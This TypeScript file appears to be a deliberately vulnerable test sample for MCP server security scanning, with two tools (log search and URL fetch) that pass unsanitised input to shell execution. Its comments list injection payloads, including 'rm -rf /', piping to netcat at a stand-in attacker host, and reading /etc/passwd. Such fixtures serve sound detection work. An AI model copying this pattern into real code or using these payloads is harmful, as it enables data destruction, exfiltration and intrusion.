// Copyright 2025 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// SPDX-License-Identifier: Apache-2.0

/**
 * Example 1: Command Injection via exec with Shell Metacharacters
 * THREAT: User input flows directly to shell execution
 */
import { Server } from "@modelcontextprotocol/sdk/server/index.js";
import { StdioServerTransport } from "@modelcontextprotocol/sdk/server/stdio.js";
import { exec, execSync } from "child_process";

const server = new Server(
  { name: "injection-attacks-ts-1", version: "1.0.0" },
  { capabilities: { tools: {} } }
);

// THREAT: Command Injection - user input flows to exec
server.setRequestHandler("tools/call", async (request) => {
  const { name, arguments: args } = request.params;

  if (name === "search_logs") {
    const pattern = args.pattern;  // Tainted input
    const logType = args.logType || "app";
    const contextLines = args.contextLines || 0;

    const logPaths: Record<string, string> = {
      app: "/var/log/app.log",
      system: "/var/log/syslog",
      auth: "/var/log/auth.log"
    };

    const logPath = logPaths[logType] || logPaths.app;

    // Build grep command with context
    let grepOpts = "";
    if (!args.caseSensitive) {
      grepOpts += "-i ";
    }
    if (contextLines > 0) {
      grepOpts += `-C ${contextLines} `;
    }

    // VULNERABLE: Command injection through pattern parameter
    // User can inject: '; rm -rf / #' or '$(malicious_command)' or '| nc attacker.com 4444'
    const command = `grep ${grepOpts}'${pattern}' ${logPath}`;

    return new Promise((resolve) => {
      // Execute with shell - allows command injection
      exec(command, { timeout: 10000 }, (error, stdout, stderr) => {
        if (error) {
          resolve({ content: [{ type: "text", text: "No matches found" }] });
        } else {
          resolve({
            content: [{
              type: "text",
              text: `Found ${stdout.split('\n').length} matches`
            }]
          });
        }
      });
    });
  }

  return { content: [{ type: "text", text: "Unknown tool" }] };
});

// THREAT: Another command injection vector via curl
server.setRequestHandler("tools/call", async (request) => {
  const { name, arguments: args } = request.params;

  if (name === "fetch_url") {
    const url = args.url;  // Tainted input
    const headers = args.headers || {};

    // Build curl command
    let curlCmd = `curl -s '${url}'`;

    // Add headers
    for (const [key, value] of Object.entries(headers)) {
      curlCmd += ` -H '${key}: ${value}'`;
    }

    // VULNERABLE: URL can contain shell metacharacters
    // User can inject: "http://example.com'; cat /etc/passwd #"
    try {
      const result = execSync(curlCmd, { timeout: 30000, encoding: 'utf-8' });
      return { content: [{ type: "text", text: result }] };
    } catch (error) {
      return { content: [{ type: "text", text: "Fetch failed" }] };
    }
  }

  return { content: [{ type: "text", text: "Unknown tool" }] };
});

const transport = new StdioServerTransport();
server.connect(transport);
